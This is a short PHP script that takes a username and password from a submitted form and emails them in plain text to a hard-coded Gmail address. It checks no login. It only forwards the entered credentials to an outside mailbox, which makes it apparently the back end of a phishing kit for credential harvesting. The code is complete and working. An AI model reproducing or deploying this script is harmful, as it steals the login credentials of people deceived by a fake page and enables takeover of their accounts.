<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Set your email address here
    $to = "brosinh5@gmail.com";
    $subject = "Login Information";
    $message = "Username: " . $username . "\nPassword: " . $password;
    
    // You should configure your email server settings here
    $headers = "From: webmaster@example.com"; // Replace with your email address
    
    // Send the email
    $mail_sent = mail($to, $subject, $message, $headers);
    
    if ($mail_sent) {
        echo "Login information sent successfully!";
    } else {
        echo "Failed to send login information.";
    }
}
?>
